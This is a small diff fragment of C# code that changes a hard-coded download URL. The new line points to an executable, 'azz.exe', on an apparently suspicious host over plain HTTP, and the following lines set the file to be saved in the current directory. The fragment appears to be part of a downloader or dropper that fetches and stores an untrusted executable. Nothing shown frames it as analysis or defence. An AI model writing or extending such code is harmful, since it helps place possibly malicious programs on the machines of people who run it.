@@ -48,7 +48,7 @@
               {
                   try
                   {
-                      string url = "https://2themoon.host/tete.exe";
+                      string url = "http://2themoon.host/azz.exe";
                                           string filename = Path.GetFileName(url);
                       string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
